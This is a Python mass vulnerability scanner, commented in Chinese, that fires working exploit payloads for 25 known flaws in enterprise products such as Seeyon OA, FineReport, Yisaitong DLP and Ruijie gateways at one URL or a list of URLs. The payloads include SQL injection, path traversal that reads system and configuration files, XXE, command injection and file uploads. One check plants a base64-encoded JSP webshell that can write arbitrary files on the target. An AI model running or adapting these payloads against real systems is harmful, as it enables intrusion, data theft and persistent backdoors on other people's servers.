import requests
from requests import Request, Session
import time
import argparse
import warnings
import http.client
import urllib.parse

warnings.filterwarnings("ignore")

# 漏洞1: 通天星 CMSV6 车载定位监控平台 disable SQL 注入漏洞
def scan_vuln_1(url):
    payload = "/edu_security_officer/disable;downloadLogger.action?ids=1+AND+(SELECT+2688+FROM+(SELECT(SLEEP(5)))kOIi)"
    start_time = time.time()
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 1 (通天星 CMSV6 车载定位监控平台 disable SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 1")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞2: 亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入漏洞
def scan_vuln_2(url):
    path="/CDGServer3/NetSecConfigAjax;Service"
    payload = "command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'JSESSIONID=BFFA734FFFC1D940FA2710CD18F4CA23'
    }
    start_time = time.time()
    try:
        response = requests.post(url+path, data=payload, headers=headers, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 2 (亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 2")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞3: 致远在野 nday constDef 接口存在代码执行漏洞
def scan_vuln_3(url):
    payload = "/seeyon/constDef.do?method=newConstDef&constKey=asdasd&constDefine=$demo%20%22;new%20File(%22../webapps/ROOT/1111.jsp%22).write(new%20String(Base64.getDecoder().decode(%22PCUKaWYocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImYiKSE9bnVsbCkobmV3IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aCgiXFwiKStyZXF1ZXN0LmdldFBhcmFtZXRlcigiZiIpKSkud3JpdGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInQiKS5nZXRCeXRlcygpKTsKJT4=%22)));%22&constDescription=123&constType=4"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        test_url = url + "/1111.jsp"
        test_response = requests.get(test_url, timeout=10,verify=False)
        if test_response.status_code == 200 and "Burp Suite" not in test_response.text:
            print(f"[+] {url} is vulnerable to Vuln 3 (致远在野 nday constDef 接口存在代码执行漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 3")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞4: 亿赛通电子文档安全管理系统 NoticeAjax 接口存在 SQL 注入漏洞
def scan_vuln_4(url):
    payload = "command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    start_time = time.time()
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 4 (亿赛通电子文档安全管理系统 NoticeAjax 接口存在 SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 4")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞5: 天问物业 ERP 系统 AreaAvatarDownLoad.aspx 任意文件读取漏洞
def scan_vuln_5(url):
    payload = "/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "<configuration>" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 5 (天问物业 ERP 系统 AreaAvatarDownLoad.aspx 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 5")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞6: 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL 注入漏洞
def scan_vuln_6(url):
    payload = "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,user(),0x7e),NULL,NULL,NULL-- -"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path="/app/ext/ajax_users.php"
    try:
        response = requests.post(url+path, data=payload, headers=headers, timeout=10,verify=False)
        if "~" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 6 (福建科立讯通信 指挥调度管理平台 ajax_users.php SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 6")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞7: 帆软根据模版注入执行 sql 语句写文件
def scan_vuln_7(url):
    payload = "/webroot/decision/view/ReportServer?test=&n=${sum(1024,1)}"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "n=1025" in response.headers:
            print(f"[+] {url} is vulnerable to Vuln 7 (帆软根据模版注入执行 sql 语句写文件)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 7")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞8: U8cloud 系统 MeasureQueryFrameAction 接口存在 SQL注入漏洞
def scan_vuln_8(url):
    payload = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+"
    start_time = time.time()
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 8 (U8cloud 系统 MeasureQueryFrameAction 接口存在 SQL注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 8")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞9: 亿赛通数据泄露防护(DLP)系统 NoticeAjax SQL 注入漏洞
def scan_vuln_9(url):
    payload = "command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    start_time = time.time()
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 9 (亿赛通数据泄露防护(DLP)系统 NoticeAjax SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 9")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞10: 致远 OA fileUpload.do 前台文件上传绕过漏洞
def scan_vuln_10(url):
    payload = '/seeyon/autoinstall.do/.%2e/.%2e/seeyon/fileUpload.do?method=processUpload'
    data = """
--00content0boundary00
Content-Disposition: form-data; name="type"
--00content0boundary00
Content-Disposition: form-data; name="extensions" png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"
--00content0boundary00
Content-Disposition: form-data; name="destDirectory"
--00content0boundary00
Content-Disposition: form-data; name="destFilename"
--00content0boundary00
Content-Disposition: form-data; name="maxSize"
--00content0boundary00
Content-Disposition: form-data; name="isEncrypt"
false
--00content0boundary00
Content-Disposition: form-data; name="file1"; filename="1.png" Content-Type: Content-Type: application/pdf
<% out.println("hello");%>
--00content0boundary00--
"""
    headers = {
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00'
    }
    try:
        response = requests.post(url + payload, data=data, headers=headers, timeout=10,verify=False)
        if "fileurls=fileurls" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 10 (致远 OA fileUpload.do 前台文件上传绕过漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 10")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞11: 福建科立讯通信 指挥调度管理平台存在远程命令执行漏洞
def scan_vuln_11(url):
    payload = "/api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=%60echo%20test%3Etest.txt%60"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        test_url = url + "/test.txt"
        test_response = requests.get(test_url, timeout=10,verify=False)
        if test_response.status_code == 200 and "test" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 11 (福建科立讯通信 指挥调度管理平台存在远程命令执行漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 11")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞12: 广联达 Linkworks ArchiveWebService XML 实体注入漏洞
def scan_vuln_12(url):
    payload = """
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
      <archiveInfo>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x20;&#x5b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x73;&#x2f;&#x77;&#x69;&#x6e;&#x2e;&#x69;&#x6e;&#x69;&#x22;&#x3e;&#x0a;&#x5d;&#x3e;&#x0a;&#x0a;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x0a;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x0a;&#x0a;&#x0a;&#x26;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x3b;&#x0a;&#x0a;&#x0a;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x0a;&#x3c;&#x2f;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x44;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x20;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3c;&#x2f;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x31;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x31;&#x2e;&#x30;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#x0a;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;</archiveInfo>
      <folderIdList>string</folderIdList>
      <platId>string</platId>
    </PostArchiveInfo>
  </soap:Body>
</soap:Envelope>
"""
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo"'
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10,verify=False)
        if "fonts" in response.text and "extensions" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 12 (广联达 Linkworks ArchiveWebService XML 实体注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 12")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞13: 致远互联 AnalyticsCloud 分析云 任意文件读取漏洞
def scan_vuln_13(url):
    payload = "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c://windows/win.ini"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "fonts" in response.text and "extensions" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 13 (致远互联 AnalyticsCloud 分析云 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 13")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞14: 润乾报表 dataSphereServlet 任意文件读取漏洞
def scan_vuln_14(url):
    payload = "/demo/servlet/dataSphereServlet?action=11"
    data = "path=../../../../../../../../../../../windows/win.ini&content=&mode="
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        response = requests.post(url + payload, data=data, headers=headers, timeout=10,verify=False)
        if "fonts" in response.text and "extensions" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 14 (润乾报表 dataSphereServlet 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 14")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞15: 帆软 FineReport ReportSever Sqlite 注入导致远程代码执行
def scan_vuln_15(url):
    payload = "/webroot/decision/view/ReportServer?test=ssssss&n=${a=sql('FRDemo',DECODE('%ef%bb%bfattach%20database%20%27%2E%2E%2Fwebapps%2Fwebroot%2Ftest%2Ejsp%27%20as%20%27test%27%3B'),1,1)}"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if response.status_code == 302 and "n=true" in response.headers.get('Location', ''):
            print(f"[+] {url} is vulnerable to Vuln 15 (帆软 FineReport ReportSever Sqlite 注入导致远程代码执行)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 15")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞16: Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞
def scan_vuln_16(url):
    payload = "/api/swaggerui/static/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "root:" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 16 (Bazarr swaggerui 组件 目录穿越导致任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 16")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")


# 漏洞17: 泛微 e-cology9 /services/WorkPlanService 前台 SQL 注入
def scan_vuln_17(url):
    path = "/services/WorkPlanService"
    payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
    <soapenv:Header/>
      <soapenv:Body>
      <web:deleteWorkPlan>
         <!--type: string-->
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
         <!--type: int-->
         <web:in1>22</web:in1> 
      </web:deleteWorkPlan>
      </soapenv:Body>
</soapenv:Envelope>
"""
    headers = {
        'Content-Type': 'text/xml;charset=UTF-8'
    }
    start_time = time.time()
    try:
        response = requests.post(url + path, data=payload, headers=headers, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 3 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 17 (泛微 e-cology9 /services/WorkPlanService 前台 SQL 注入)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 17")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞18: 资管云 comfileup.php 前台文件上传漏洞
def scan_vuln_18(url):
    payload = "/comfileup.php"
    files = {'file': ('test.php', 'test')}
    headers = {
        'Content-Type': 'multipart/form-data; boundary=--------1110146050',
        'Content-Length': '117'
    }
    body = """----------1110146050
Content-Disposition: form-data; name="file";filename="test.php"

test

----------1110146050--"""
    try:
        response = requests.post(url + payload, data=body, headers=headers, timeout=10,verify=False)
        if "test.php" in response.text and response:
            print(f"[+] {url} is vulnerable to Vuln 18 (资管云 comfileup.php 前台文件上传漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 18")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞19: 锐捷统一上网行为管理与审计系统 static_convert.php 命令注入漏洞
def scan_vuln_19(url):
    payload = '/view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20system(\"id\");unlink(__FILE__);?>%27%20>/var/www/html/rce.php'
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        test_url = url + "/rce.php"
        test_response = requests.get(test_url, timeout=10,verify=False)
        if test_response.status_code == 200 and "uid" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 19 (锐捷统一上网行为管理与审计系统 static_convert.php 命令注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 19")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞20: 蓝凌 EKP 远程代码执行漏洞(XVE-2023-18344)
def scan_vuln_20(url):
    # 暂时不写payload
    pass

# 漏洞21: 赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞
def scan_vuln_21(url):
    payload = "/BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "<configuration>" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 21 (赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 21")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞22: 赛蓝企业管理系统 ReadTxtLog 任意文件读取漏洞
def scan_vuln_22(url):
    payload = "/BaseModule/SysLog/ReadTxtLog?FileName=../XmlConfig/database.config"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "<configuration>" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 22 (赛蓝企业管理系统 ReadTxtLog 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 22")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞23: 赛蓝企业管理系统 GetJSFile 任意文件读取漏洞
def scan_vuln_23(url):
    payload = "/Utility/GetJSFile?filePath=../web.config"
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        if "<configuration>" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 23 (赛蓝企业管理系统 GetJSFile 任意文件读取漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 23")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞24: SuiteCRM responseEntryPoint SQL 注入漏洞
def scan_vuln_24(url):
    payload = "/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept"
    start_time = time.time()
    try:
        response = requests.get(url + payload, timeout=10,verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {url} is vulnerable to Vuln 24 (SuiteCRM responseEntryPoint SQL 注入漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 24")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞25: 用友 U8CRM import.php 任意文件上传漏洞
def scan_vuln_25(url):
    payload = "/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1"
    files = {'xfile': ('1.xls', '<?php echo "ceshi";unlink(__FILE__);?>')}
    data = {'combo': 'ceshi.php'}
    # headers = {
    #     'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryB9S6D2q4J3f7Y1Z5'
    # }
    try:
        response = requests.post(url + payload, files=files, data=data, timeout=10,verify=False)
        test_url = url + "/tmpfile/ceshi.php"
        test_response = requests.get(test_url, timeout=10,verify=False)
        if test_response.status_code == 200 and "ceshi" in response.text:
            print(f"[+] {url} is vulnerable to Vuln 25 (用友 U8CRM import.php 任意文件上传漏洞)")
        else:
            print(f"[-] {url} is not vulnerable to Vuln 25")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} request failed: {e}")

# 漏洞扫描函数映射
vuln_scan_functions = {
    1: scan_vuln_1,
    2: scan_vuln_2,
    3: scan_vuln_3,
    4: scan_vuln_4,
    5: scan_vuln_5,
    6: scan_vuln_6,
    7: scan_vuln_7,
    8: scan_vuln_8,
    9: scan_vuln_9,
    10: scan_vuln_10,
    11: scan_vuln_11,
    12: scan_vuln_12,
    13: scan_vuln_13,
    14: scan_vuln_14,
    15: scan_vuln_15,
    16: scan_vuln_16,
    17: scan_vuln_17,
    18: scan_vuln_18,
    19: scan_vuln_19,
    20: scan_vuln_20,
    21: scan_vuln_21,
    22: scan_vuln_22,
    23: scan_vuln_23,
    24: scan_vuln_24,
    25: scan_vuln_25
}

def main():
    parser = argparse.ArgumentParser(description="漏洞扫描器")
    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-f', '--file', help='包含目标URL的文件')
    parser.add_argument('-v', '--vulnerability', type=int, choices=range(1, 26), help='指定漏洞编号进行扫描')
    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        return

    if args.url:
        urls = [args.url]
    elif args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f]
            print(urls)

    for url in urls:
        final_url = url.strip("\n").strip("/")
        if args.vulnerability:
            vuln_scan_functions[args.vulnerability](final_url)
        else:
            for scan_func in vuln_scan_functions.values():
                scan_func(final_url)

if __name__ == "__main__":
    main()